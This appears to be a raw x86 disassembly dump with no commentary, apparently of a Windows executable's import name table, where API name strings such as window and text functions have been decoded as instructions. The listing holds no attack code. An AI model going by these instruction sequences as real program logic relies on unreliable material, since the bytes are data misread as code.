  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
